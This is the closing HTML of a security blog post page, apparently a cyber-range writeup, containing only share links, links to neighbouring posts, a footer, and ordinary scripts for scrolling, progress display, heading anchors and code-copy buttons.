+      document.documentElement.scrollTop = 0; // For Chrome, Firefox, IE and Opera
+    });
+
+    // Handle button visibility according to scroll position
+    let lastVisible = null;
+    function handleScroll() {
+      const scrollTotal = rootElement.scrollHeight - rootElement.clientHeight;
+      const scrollTop = rootElement.scrollTop;
+      const scrollPercent = Math.floor((scrollTop / scrollTotal) * 100);
+
+      progressIndicator.style.setProperty(
+        "background-image",
+        `conic-gradient(var(--accent), var(--accent) ${scrollPercent}%, transparent ${scrollPercent}%)`
+      );
+
+      const isVisible = scrollTop / scrollTotal > 0.3;
+
+      if (isVisible !== lastVisible) {
+        btnContainer.classList.toggle("opacity-100", isVisible);
+        btnContainer.classList.toggle("translate-y-0", isVisible);
+        btnContainer.classList.toggle("opacity-0", !isVisible);
+        btnContainer.classList.toggle("translate-y-14", !isVisible);
+        lastVisible = isVisible;
+      }
+    }
+
+    let ticking = false;
+    document.addEventListener("scroll", () => {
+      if (!ticking) {
+        window.requestAnimationFrame(() => {
+          handleScroll();
+          ticking = false;
+        });
+        ticking = true;
+      }
+    });
+  }
+  backToTop();
+</script> <div class="flex flex-none flex-col items-center justify-center gap-1 md:items-start"><span class="italic">Share this post on:</span><div class="text-center"><a href="https://wa.me/?text=https://exp10it.io/posts/chunqiuyunjing-initial-writeup/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post via WhatsApp"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M3 21l1.65 -3.8a9 9 0 1 1 3.4 2.9l-5.05 .9" /><path d="M9 10a.5 .5 0 0 0 1 0v-1a.5 .5 0 0 0 -1 0v1a5 5 0 0 0 5 5h1a.5 .5 0 0 0 0 -1h-1a.5 .5 0 0 0 0 1" /></svg><span class="sr-only">Share this post via WhatsApp</span></a><a href="https://www.facebook.com/sharer.php?u=https://exp10it.io/posts/chunqiuyunjing-initial-writeup/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post on Facebook"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M7 10v4h3v7h4v-7h3l1 -4h-4v-2a1 1 0 0 1 1 -1h3v-4h-3a5 5 0 0 0 -5 5v2h-3" /></svg><span class="sr-only">Share this post on Facebook</span></a><a href="https://x.com/intent/post?url=https://exp10it.io/posts/chunqiuyunjing-initial-writeup/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post on X"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M4 4l11.733 16h4.267l-11.733 -16z" /><path d="M4 20l6.768 -6.768m2.46 -2.46l6.772 -6.772" /></svg><span class="sr-only">Share this post on X</span></a><a href="https://t.me/share/url?url=https://exp10it.io/posts/chunqiuyunjing-initial-writeup/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post via Telegram"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M15 10l-4 4l6 6l4 -16l-18 7l4 2l2 6l3 -4" /></svg><span class="sr-only">Share this post via Telegram</span></a><a href="https://pinterest.com/pin/create/button/?url=https://exp10it.io/posts/chunqiuyunjing-initial-writeup/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post on Pinterest"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M8 20l4 -9" /><path d="M10.7 14c.437 1.263 1.43 2 2.55 2c2.071 0 3.75 -1.554 3.75 -4a5 5 0 1 0 -9.7 1.7" /><path d="M12 12m-9 0a9 9 0 1 0 18 0a9 9 0 1 0 -18 0" /></svg><span class="sr-only">Share this post on Pinterest</span></a><a href="mailto:?subject=See%20this%20post&#38;body=https://exp10it.io/posts/chunqiuyunjing-initial-writeup/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post via email"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M3 7a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v10a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-10z" /><path d="M3 7l9 6l9 -6" /></svg><span class="sr-only">Share this post via email</span></a></div></div> <hr class="my-6 border-dashed"> <!-- Previous/Next Post Buttons --> <div data-pagefind-ignore class="grid grid-cols-1 gap-6 sm:grid-cols-2"> <a href="/posts/chunqiuyunjing-tsclient-writeup" class="flex w-full gap-1 hover:opacity-75"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block flex-none rtl:rotate-180"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M15 6l-6 6l6 6" /></svg> <div> <span>Previous Post</span> <div class="text-sm text-accent/85">春秋云镜 Tsclient Writeup</div> </div> </a> <a href="/posts/2023-ciscn-final-awd-and-pentest-writeup" class="flex w-full justify-end gap-1 text-end hover:opacity-75 sm:col-start-2"> <div> <span>Next Post</span> <div class="text-sm text-accent/85">2023 CISCN 总决赛 AWD &amp; 渗透 Writeup</div> </div> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block flex-none rtl:rotate-180"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M9 6l6 6l-6 6" /></svg> </a> </div> </main> <footer class="w-full mt-auto"> <div class="mx-auto max-w-app px-0"> <hr class="border-border" aria-hidden="true"> </div> <div class="flex flex-col items-center justify-between py-6 sm:flex-row-reverse sm:py-4"> <div class="flex-wrap justify-center gap-1 flex"> <a href="https://github.com/X1r0z" class="group inline-block hover:text-accent p-2 hover:rotate-6 sm:p-1" title="X1r0z Blog on GitHub"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" /></svg> <span class="sr-only">X1r0z Blog on GitHub</span> </a><a href="https://x.com/X1r0z" class="group inline-block hover:text-accent p-2 hover:rotate-6 sm:p-1" title="X1r0z Blog on X"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M4 4l11.733 16h4.267l-11.733 -16z" /><path d="M4 20l6.768 -6.768m2.46 -2.46l6.772 -6.772" /></svg> <span class="sr-only">X1r0z Blog on X</span> </a><a href="https://www.linkedin.com/in/x1r0z/" class="group inline-block hover:text-accent p-2 hover:rotate-6 sm:p-1" title="X1r0z Blog on LinkedIn"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M8 11v5" /><path d="M8 8v.01" /><path d="M12 16v-5" /><path d="M16 16v-3a2 2 0 1 0 -4 0" /><path d="M3 7a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v10a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4z" /></svg> <span class="sr-only">X1r0z Blog on LinkedIn</span> </a><a href="mailto:i@exp10it.io" class="group inline-block hover:text-accent p-2 hover:rotate-6 sm:p-1" title="Send an email to X1r0z Blog"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M3 7a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v10a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-10z" /><path d="M3 7l9 6l9 -6" /></svg> <span class="sr-only">Send an email to X1r0z Blog</span> </a> </div> <div class="my-2 flex flex-col items-center whitespace-nowrap sm:flex-row"> <span>Copyright &#169; 2026</span> <span class="hidden sm:inline">&nbsp;|&nbsp;</span> <span>All rights reserved.</span> </div> </div> </footer>  </body></html> <script data-astro-rerun>
+  /** Create a progress indicator
+   *  at the top */
+  function createProgressBar() {
+    // Create the main container div
+    const progressContainer = document.createElement("div");
+    progressContainer.className =
+      "progress-container fixed top-0 z-10 h-1 w-full bg-background";
+
+    // Create the progress bar div
+    const progressBar = document.createElement("div");
+    progressBar.className = "progress-bar h-1 w-0 bg-accent";
+    progressBar.id = "myBar";
+
+    // Append the progress bar to the progress container
+    progressContainer.appendChild(progressBar);
+
+    // Append the progress container to the document body or any other desired parent element
+    document.body.appendChild(progressContainer);
+  }
+  createProgressBar();
+
+  /** Update the progress bar
+   *  when user scrolls */
+  function updateScrollProgress() {
+    document.addEventListener("scroll", () => {
+      const winScroll =
+        document.body.scrollTop || document.documentElement.scrollTop;
+      const height =
+        document.documentElement.scrollHeight -
+        document.documentElement.clientHeight;
+      const scrolled = (winScroll / height) * 100;
+      if (document) {
+        const myBar = document.getElementById("myBar");
+        if (myBar) {
+          myBar.style.width = scrolled + "%";
+        }
+      }
+    });
+  }
+  updateScrollProgress();
+
+  /** Attaches links to headings in the document,
+   *  allowing sharing of sections easily */
+  function addHeadingLinks() {
+    const headings = Array.from(
+      document.querySelectorAll("h2, h3, h4, h5, h6")
+    );
+    for (const heading of headings) {
+      heading.classList.add("group");
+      const link = document.createElement("a");
+      link.className =
+        "heading-link ms-2 no-underline opacity-75 md:opacity-0 md:group-hover:opacity-100 md:focus:opacity-100";
+      link.href = "#" + heading.id;
+
+      const span = document.createElement("span");
+      span.ariaHidden = "true";
+      span.innerText = "#";
+      link.appendChild(span);
+      heading.appendChild(link);
+    }
+  }
+  addHeadingLinks();
+
+  /** Attaches copy buttons to code blocks in the document,
+   * allowing users to copy code easily. */
+  function attachCopyButtons() {
+    const copyButtonLabel = "Copy";
+    const codeBlocks = Array.from(document.querySelectorAll("pre"));
+
+    for (const codeBlock of codeBlocks) {
+      const wrapper = document.createElement("div");
+      wrapper.style.position = "relative";
+
+      // Check if --file-name-offset custom property exists
+      const computedStyle = getComputedStyle(codeBlock);
+      const hasFileNameOffset =
+        computedStyle.getPropertyValue("--file-name-offset").trim() !== "";
+
+      // Determine the top positioning class
+      const topClass = hasFileNameOffset
+        ? "top-(--file-name-offset)"
+        : "-top-3";
+
+      const copyButton = document.createElement("button");
+      copyButton.className = `copy-code absolute end-3 ${topClass} rounded bg-muted border border-muted px-2 py-1 text-xs leading-4 text-foreground font-medium`;
+      copyButton.innerHTML = copyButtonLabel;
+      codeBlock.setAttribute("tabindex", "0");
+      codeBlock.appendChild(copyButton);
+
+      // wrap codebock with relative parent element
+      codeBlock?.parentNode?.insertBefore(wrapper, codeBlock);
+      wrapper.appendChild(codeBlock);
+
+      copyButton.addEventListener("click", async () => {
+        await copyCode(codeBlock, copyButton);
+      });
+    }
+
+    async function copyCode(block, button) {
+      const code = block.querySelector("code");
+      const text = code?.innerText;
+
+      await navigator.clipboard.writeText(text ?? "");
+
+      // visual feedback that task is completed
+      button.innerText = "Copied";
+
+      setTimeout(() => {
+        button.innerText = copyButtonLabel;
+      }, 700);
+    }
+  }
+  attachCopyButtons();
+
+  /* Go to page start after page swap */
+  document.addEventListener("astro:after-swap", () =>
+    window.scrollTo({ left: 0, top: 0, behavior: "instant" })
+  );
+</script>
